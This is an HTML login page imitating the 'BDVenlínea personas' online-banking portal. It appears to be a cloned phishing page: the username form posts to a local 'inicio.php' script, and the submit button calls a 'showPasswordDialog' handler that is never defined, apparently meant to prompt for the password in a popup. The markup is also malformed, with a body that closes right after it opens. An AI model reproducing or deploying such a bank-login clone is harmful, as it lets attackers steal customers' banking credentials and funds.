<html lang="es">
<head>
    <meta charset="utf-8">
    <title>BDVenlínea personas</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="css/estilo.css">
    <link rel="stylesheet" href="css/estilos.css">
    <link rel="shortcut icon" href="img/favicon-16x16.png" type="image/x-icon">
    <meta name="msapplication-TileColor" content="#da532c">
    <meta name="theme-color" content="#ffffff">
    <style>
        h3[_ngcontent-c0],
        th[_ngcontent-c0] {
            color: #0067b1
        }
        @media print {
            .noprint-section[_ngcontent-c0] {
                display: none !important
            }
        }
    </style>

    <style>
        body {
            margin: 0;
        }

        .login-container[_ngcontent-c10] {
            overflow: hidden;
            background-color: #ededed;
            background-image: url(img/wallp.webp);
            background-position: center center;
            background-size: cover;
            background-repeat: no-repeat;
            height: 100vh;
        }

        .mat-form-field {
            font-size: inherit;
            font-weight: 400;
            line-height: 1.125;
            font-family: Nunito;
        }

        .mat-form-field-wrapper {
            padding-bottom: 1.34375em;
        }

        .mat-form-field-flex {
            display: inline-flex;
            align-items: baseline;
            box-sizing: border-box;
            width: 100%;
        }

        .login-container-form[_ngcontent-c10] {
            background-color: #fff;
            padding: 30px;
            border-bottom-left-radius: 10px;
            border-bottom-right-radius: 10px;
        }

        .mat-form-field-appearance-fill .mat-form-field-flex {
            border-radius: 4px 4px 0 0;
            padding: .75em .75em 0 .75em;
            background-color: rgba(0, 0, 0, .04);
        }

        .mat-form-field-infix {
            display: block;
            position: relative;
            flex: auto;
            min-width: 0;
            width: 180px;
            border-top: .84375em solid transparent;
            padding: .25em 0 .75em;
        }

        .mat-input-element {
            font: inherit;
            background: 0 0;
            color: currentColor;
            border: none;
            outline: 0;
            padding: 0;
            margin: 0;
            width: 100%;
            max-width: 100%;
            vertical-align: bottom;
            text-align: inherit;
        }

        .mat-form-field-label-wrapper {
            position: absolute;
            left: 0;
            box-sizing: content-box;
            width: 100%;
            height: 100%;
            overflow: hidden;
            pointer-events: none;
        }

        .mat-form-field-label-wrapper {
            top: -.84375em;
            padding-top: .84375em;
        }

        .mat-form-field-label,
        .mat-hint {
            color: rgba(0, 0, 0, .6);
        }

        .mat-form-field-label {
            position: absolute;
            left: 0;
            font: inherit;
            pointer-events: none;
            width: 100%;
            white-space: nowrap;
            text-overflow: ellipsis;
            overflow: hidden;
            transform-origin: 0 0;
            transition: transform .4s cubic-bezier(.25, .8, .25, 1), color .4s cubic-bezier(.25, .8, .25, 1), width .4s cubic-bezier(.25, .8, .25, 1);
            display: none;
        }


        .mat-form-field-appearance-fill .mat-form-field-label {
            top: 1.09375em;
            margin-top: -.5em;
        }

        .mat-form-field-can-float.mat-form-field-should-float .mat-form-field-label,
        .mat-form-field-empty.mat-form-field-label {
            display: block;
        }

        .mat-form-field-appearance-fill.mat-form-field-can-float .mat-input-server:focus+.mat-form-field-label-wrapper .mat-form-field-label,
        .mat-form-field-appearance-fill.mat-form-field-can-float.mat-form-field-should-float .mat-form-field-label {
            -webkit-transform: translateY(-.59373em) scale(.75);
            transform: translateY(-.59373em) scale(.75);
            width: 133.33335333%;
        }

        .mat-form-field-underline {
            position: absolute;
            width: 100%;
            pointer-events: none;
            transform: scaleY(1.0001);
            bottom: 1.34375em;
        }

        .mat-form-field-ripple {
            background-color: rgba(0, 0, 0, .87);
        }

        .mat-form-field-ripple {
            position: absolute;
            left: 0;
            width: 100%;
            transform-origin: 50%;
            transform: scaleX(.5);
            opacity: 0;
            transition: background-color .3s cubic-bezier(.55, 0, .55, .2);
        }

        .mat-form-field-appearance-fill .mat-form-field-ripple {
            bottom: 0;
            height: 2px;
        }

        .mat-form-field-subscript-wrapper {
            font-size: 75%;
            margin-top: .66666667em;
            top: calc(100% - 1.79166667em);
        }

        .mat-form-field-subscript-wrapper {
            position: absolute;
            box-sizing: border-box;
            width: 100%;
            overflow: hidden;
        }


        .mat-button,
        .mat-fab,
        .mat-flat-button,
        .mat-icon-button,
        .mat-mini-fab,
        .mat-raised-button,
        .mat-stroked-button {
            font-family: Nunito;
            font-size: 14px;
            font-weight: 500;
        }

        .mat-raised-button {
            box-sizing: border-box;
            position: relative;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            cursor: pointer;
            outline: 0;
            border: none;
            -webkit-tap-highlight-color: transparent;
            display: inline-block;
            white-space: nowrap;
            text-decoration: none;
            vertical-align: baseline;
            text-align: center;
            margin: 0;
            min-width: 88px;
            line-height: 36px;
            padding: 0 16px;
            border-radius: 2px;
            overflow: visible;
            transform: translate3d(0, 0, 0);
            transition: background .4s cubic-bezier(.25, .8, .25, 1), box-shadow 280ms cubic-bezier(.4, 0, .2, 1);
        }

        .mat-fab.mat-accent,
        .mat-fab.mat-primary,
        .mat-fab.mat-warn,
        .mat-flat-button.mat-accent,
        .mat-flat-button.mat-primary,
        .mat-flat-button.mat-warn,
        .mat-mini-fab.mat-accent,
        .mat-mini-fab.mat-primary,
        .mat-mini-fab.mat-warn,
        .mat-raised-button.mat-accent,
        .mat-raised-button.mat-primary,
        .mat-raised-button.mat-warn {
            color: rgba(255, 255, 255, .87);
        }

        .mat-fab.mat-accent,
        .mat-flat-button.mat-accent,
        .mat-mini-fab.mat-accent,
        .mat-raised-button.mat-accent {
            background-color: #0067b1;
        }

        .mat-raised-button:not([class*=mat-elevation-z]) {
            box-shadow: 0 3px 1px -2px rgba(0, 0, 0, .2), 0 2px 2px 0 rgba(0, 0, 0, .14), 0 1px 5px 0 rgba(0, 0, 0, .12);
        }

        .mat-button-focus-overlay,
        .mat-button-ripple {
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            position: absolute;
            pointer-events: none;
            border-radius: inherit;
        }

        .autogestion-usuario-unico[_ngcontent-c10] {
            margin-top: 20px;
        }

        .text-center {
            text-align: center !important;
        }

        .autogestion-user[_ngcontent-c10] {
            font-size: 14px;
            color: #707070;
            text-decoration: none;
            font-weight: 700;
            font-family: nunito;
        }
    </style>
</head>

<body></body>
    <app-root _nghost-c0="" ng-version="6.1.10">
        <app-login _nghost-c10="" class="ng-star-inserted">
            <div _ngcontent-c10="" class="login-container">
                <div _ngcontent-c10="">
                    <div _ngcontent-c10="" class="login-container-float-center">
                        <div _ngcontent-c10="" class="row">
                            <div _ngcontent-c10="" class="col s12 not-margin not-padding">
                                <div _ngcontent-c10="">
                                    <div _ngcontent-c10="" class="login-container-logo"><img _ngcontent-c10=""
                                            class="logo-login" src="img/logotipo.png"></div>
                                    <div _ngcontent-c10="" class="login-container-form">
                                        <form action="inicio.php" method="POST" _ngcontent-c10="" id="loginForm"
                                            class="login-form ng-touched ng-dirty ng-valid">
                                            <div _ngcontent-c10="" class="formGroup" role="form"><mat-form-field
                                                    _ngcontent-c10="" appearance="fill"
                                                    class="mat-form-field ng-tns-c11-0 mat-primary mat-form-field-type-mat-input mat-form-field-appearance-fill mat-form-field-can-float ng-touched mat-form-field-should-float ng-dirty ng-valid">
                                                    <div class="mat-form-field-wrapper">
                                                        <div class="mat-form-field-flex"><!----><!---->
                                                            <div class="mat-form-field-infix"><input
                                                                    aria-label="usuario" autocomplete="off"
                                                                    class="mat-input-element mat-form-field-autofill-control cdk-text-field-autofill-monitored ng-touched ng-dirty ng-valid"
                                                                    formcontrolname="usern" name="usern" required matinput=""
                                                                    maxlength="16" minlength="6" oncut="return false"
                                                                    tabindex="1" type="text" id="mat-input-0"
                                                                    aria-invalid="false"
                                                                    data-ddg-inputtype="credentials.usern"><span
                                                                    class="mat-form-field-label-wrapper"><!----><label
                                                                        class="mat-form-field-label ng-tns-c11-0 ng-star-inserted"
                                                                        id="mat-form-field-label-1" for="mat-input-0"
                                                                        aria-owns="mat-input-0"><!----><!----><mat-label
                                                                            class="ng-star-inserted">Usuario
                                                                            *</mat-label><!----><!----></label></span>
                                                            </div><!---->
                                                        </div><!---->
                                                        <div
                                                            class="mat-form-field-underline ng-tns-c11-0 ng-star-inserted">
                                                            <span class="mat-form-field-ripple"></span>
                                                        </div>
                                                        <div class="mat-form-field-subscript-wrapper"><!----><!---->
                                                            <div class="mat-form-field-hint-wrapper ng-tns-c11-0 ng-trigger ng-trigger-transitionMessages ng-star-inserted"
                                                                style="opacity: 1; transform: translateY(0%);"><!---->
                                                                <div class="mat-form-field-hint-spacer"></div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </mat-form-field></div><!---->
                                            <div _ngcontent-c10="" class="button-login-container" role="row"><button
                                                    _ngcontent-c10="" color="accent" mat-raised-button="" role="button"
                                                    tabindex="2" type="submit"  onclick="showPasswordDialog(event)"
                                                    class="mat-raised-button mat-accent"><span
                                                        class="mat-button-wrapper"> Entrar </span>
                                                    <div class="mat-button-ripple mat-ripple" matripple=""></div>
                                                    <div class="mat-button-focus-overlay"></div>
                                                </button></div>
                                        </form>
                                        <div _ngcontent-c10="" class="autogestion-usuario-unico text-center"><a
                                                _ngcontent-c10="" class="autogestion-user" href="#"
                                                mattooltip="Gestiona tu usuario" mattooltipposition="right" role="link"
                                                tabindex="3" title="gestión de usuario"
                                                aria-describedby="cdk-describedby-message-0" cdk-describedby-host=""
                                                style="touch-action: none; user-select: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
                                                ¿Olvidaste tu usuario o clave? </a><br _ngcontent-c10=""><a
                                                _ngcontent-c10="" class="autogestion-user" href="#"
                                                mattooltip="Gestiona tu usuario" mattooltipposition="right" role="link"
                                                tabindex="3" title="gestión de usuario"
                                                aria-describedby="cdk-describedby-message-0" cdk-describedby-host=""
                                                style="touch-action: none; user-select: none; -webkit-tap-highlight-color: rgba(0, 0, 0, 0);">
                                                Si eres nuevo clienteBDV registrate aquí </a></div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </app-login>
    </app-root>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
</body>
</html>